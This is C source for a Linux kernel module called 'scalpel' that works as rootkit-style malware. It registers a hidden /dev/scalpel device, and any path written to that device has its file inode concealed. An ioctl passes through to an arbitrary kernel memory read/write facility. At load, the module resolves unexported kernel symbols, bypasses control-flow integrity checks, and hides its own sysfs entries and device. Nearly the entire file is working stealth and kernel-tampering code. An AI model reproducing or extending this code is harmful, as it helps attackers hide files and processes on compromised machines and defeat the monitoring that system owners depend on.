/* SPDX-License-Identifier: GPL-2.0 */
/*
 * scalpel/scalpel_main.c - Main module for scalpel device
 *
 * Copyright (C) 2026 Kaidevon
 */
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/path.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "hide/hide_inode.h"
#include "hide/hide_module.h"
#include "ksym_get.h"
#include "memrw/memrw.h"

typedef int (*kern_path_t)(const char *name, unsigned int flags,
			   struct path *path);
typedef void (*path_put_t)(const struct path *path);

static kern_path_t kern_path_fn;
static path_put_t path_put_fn;

__attribute__((no_sanitize("cfi"))) static int
call_kern_path(const char *name, unsigned int flags, struct path *path)
{
	return kern_path_fn(name, flags, path);
}

__attribute__((no_sanitize("cfi"))) static void
call_path_put(const struct path *path)
{
	path_put_fn(path);
}

static int scalpel_open(struct inode *inode, struct file *file)
{
	return 0;
}

static ssize_t scalpel_write(struct file *file, const char __user *buf,
			     size_t len, loff_t *off)
{
	char *path_str;
	struct path path;
	int ret;

	path_str = kzalloc(len + 1, GFP_KERNEL);
	if (!path_str)
		return -ENOMEM;

	if (copy_from_user(path_str, buf, len)) {
		kfree(path_str);
		return -EFAULT;
	}
	path_str[len] = '\0';

	if (len > 0 && path_str[len - 1] == '\n')
		path_str[len - 1] = '\0';

	ret = call_kern_path(path_str, 0, &path);
	if (ret) {
		kfree(path_str);
		return ret;
	}

	if (!path.dentry->d_inode) {
		call_path_put(&path);
		kfree(path_str);
		return -ENOENT;
	}

	ret = hide_inode(path.dentry->d_inode);

	call_path_put(&path);
	kfree(path_str);

	if (ret == 0 || ret == -EEXIST)
		return len;
	return ret;
}

static long scalpel_ioctl(struct file *file, unsigned int cmd,
			  unsigned long arg)
{
	long ret = memrw_ioctl(cmd, arg);

	if (ret != -ENOTTY)
		return ret;
	return -ENOTTY;
}

static const struct file_operations scalpel_fops = {
	.owner = THIS_MODULE,
	.open = scalpel_open,
	.write = scalpel_write,
	.unlocked_ioctl = scalpel_ioctl,
};

static struct miscdevice scalpel_misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "scalpel",
	.fops = &scalpel_fops,
	.mode = 0600,
};

static int __init scalpel_init(void)
{
	int ret;

	if (!kern_path_fn)
		kern_path_fn = (kern_path_t)ksym_get("kern_path");
	if (!path_put_fn)
		path_put_fn = (path_put_t)ksym_get("path_put");

	if (!kern_path_fn || !path_put_fn) {
		pr_err("scalpel: failed to resolve required symbols\n");
		return -EINVAL;
	}

	ret = misc_register(&scalpel_misc);
	if (ret)
		return ret;

	ret = memrw_init();
	if (ret) {
		pr_err("scalpel: memrw_init failed (%d)\n", ret);
		misc_deregister(&scalpel_misc);
		return ret;
	}

	hide_module_sysfs_name(THIS_MODULE);
	hide_misc_device_sysfs(&scalpel_misc);

	ret = init_hiding("/dev/scalpel");
	if (ret) {
		misc_deregister(&scalpel_misc);
		return ret;
	}

	pr_info("scalpel: module loaded (with memrw support)\n");
	return 0;
}

static void __exit scalpel_exit(void)
{
	exit_hiding();
	misc_deregister(&scalpel_misc);
	pr_info("scalpel: module removed\n");
}

module_init(scalpel_init);
module_exit(scalpel_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kaidevon");
MODULE_DESCRIPTION("scalpel device.");
MODULE_VERSION("0.0.1");